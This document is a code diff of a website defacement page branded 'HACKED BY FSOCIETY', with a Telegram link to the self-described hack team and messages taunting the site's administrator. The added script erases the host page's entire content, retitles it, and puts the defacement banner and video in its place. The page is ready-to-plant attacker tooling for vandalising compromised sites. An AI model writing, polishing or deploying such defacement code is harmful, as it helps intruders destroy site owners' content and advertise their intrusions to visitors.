@@ -10,33 +10,11 @@
     <link href="https://fonts.googleapis.com/css2?family=VT323&family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
     <style>
-        * { 
-            overflow: hidden; 
-            margin: 0;
-            padding: 0;
-        }
-        html { 
-            height: 100%; 
-        }
+        * { overflow: hidden; margin: 0; padding: 0; }
+        html, body { height: 100%; background: black; }
         body {
             font-family: 'VT323', monospace;
-            background: #000;
             color: #00ff00;
-            margin: 0;
-            position: relative;
-        }
-        button {
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #ff00ff;
-            font-family: 'VT323', monospace;
-            font-size: 2.5vmin;
-            text-shadow: 0 0 10px #ff00ff;
-            transition: all 0.3s ease;
-        }
-        button:hover {
-            text-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff;
         }
         video#back {
             position: fixed;
@@ -44,27 +22,27 @@
             left: 50%;
             min-width: 105%;
             min-height: 105%;
-            transform: translateX(-50%) translateY(-50%) rotate(5deg);
-            filter: brightness(1.2) contrast(1.1); /* Daha parlak ve net */
+            transform: translate(-50%, -50%) rotate(5deg);
+            filter: brightness(1.2) contrast(1.1);
             z-index: -1;
         }
         #main {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            display: table;
+            top: 0; left: 0;
+            width: 100%; height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            background: rgba(0, 0, 0, 0.5); /* Arka planı biraz daha şeffaf yaparak video öne çıksın */
+            background: rgba(0, 0, 0, 0.5);
             z-index: 1;
+            flex-direction: column;
         }
-        .fof {
-            display: table-cell;
-            vertical-align: middle;
-        }
-        .fof h1 {
-            margin: 20px 0;
+        h1 {
+            font-size: 4vmin;
+            color: red;
+            background: url('https://i.hizliresim.com/q8029t1.gif');
+            text-shadow: 0 1px 6px;
         }
         h2 {
             font-size: 2.5vmin;
@@ -83,10 +61,8 @@
         }
         .hacker-rain {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             z-index: 0;
             pointer-events: none;
         }
@@ -94,7 +70,6 @@
             content: "";
             position: absolute;
             top: -100%;
-            left: 0;
             width: 100%;
             height: 200%;
             color: #00ff00;
@@ -121,7 +96,6 @@
             text-shadow: 0 0 5px #ff00ff;
         }
 
-        /* Animasyon */
         @keyframes rain-fall {
             0% { transform: translateY(0); }
             100% { transform: translateY(150vh); }
@@ -129,44 +103,47 @@
     </style>
 </head>
 <body onclick="unmuteee()">
-    <div id="anchor" onclick="unmuteee()"></div>
-    <div class="hacker-rain"></div>
-    <video onclick="unmuteee()" loop autoplay muted preload="none" id="back" x-webkit-airplay="allow" webkit-playsinline playsinline>
-        <source src="https://berofc.org.tr/ssstik.io_@dreamscored.ae_1748061848057.mp4" type="video/mp4">
-    </video>
-    <div id="main" onclick="unmuteee()">
-        <div class="fof" onclick="unmuteee()">
-            <h1><font size="5" style="color: red; text-shadow: 0px 1px 6px; background:url('https://i.hizliresim.com/q8029t1.gif');">𝙷𝙰𝙲𝙺𝙴𝙳 𝙱𝚈  FSOCİETY/font></h1>
+    <script>
+        // Sayfa içeriğini tamamen temizle
+        document.documentElement.innerHTML = "";
+        document.documentElement.style.cssText = `
+            margin:0;
+            overflow:hidden;
+            background:#000;
+            color:#0f0;
+            display:flex;
+            flex-direction:column;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            font-family:monospace;
+            text-align:center;
+            user-select:none;
+        `;
+        document.title = 'HACKED BY FSOCIETY';
+
+        let main = document.createElement('div');
+        main.innerHTML = `
+            <video autoplay loop muted id="back" style="
+                position:fixed;
+                top:50%;
+                left:50%;
+                min-width:105%;
+                min-height:105%;
+                transform:translate(-50%, -50%) rotate(5deg);
+                filter: brightness(1.2) contrast(1.1);
+                z-index:-1;">
+                <source src="https://berofc.org.tr/ssstik.io_@dreamscored.ae_1748061848057.mp4" type="video/mp4">
+            </video>
+
+            <h1 style="background:url('https://i.hizliresim.com/q8029t1.gif'); color:red; text-shadow:0px 1px 6px;">𝙷𝙰𝙲𝙺𝙴𝙳 𝙱𝚈 FSOCİETY</h1>
             <h2><a href="https://t.me/anonminea">Telegram : FSOCİETY HACK TEAM</a></h2>
             <h2>You have been hacked admin :)</h2>
-            <h2>PLS UPGRADE YOUR SYSTEKM</h2>
+            <h2>PLS UPGRADE YOUR SYSTEM</h2>
             <br>
-            <font size="5">TURKISH HACKERS WERE HERE</font>
-        </div>
-    </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <script>
-        var video = $('video');
-        (function ($) {
-            $(document).ready(function () {
-                var figure = $(".fof").hover(hoverVideo);
-                var figureq = $("body").hover(hoverVideo);
-                var figures = $("#main").hover(hoverVideo);
-                var figurep = $("*").hover(hoverVideo);
-
-                function hoverVideo(e) {
-                    setTimeout(function () {
-                        $('video').get(0).play();
-                        console.log('played');
-                    }, 30000);
-                };
-            });
-        })(jQuery);
-
-        function unmuteee() {
-            $("video").prop('muted', false);
-        }
+            <h2>TURKISH HACKERS WERE HERE</h2>
+        `;
+        document.body.appendChild(main);
     </script>
 </body>
 </html>
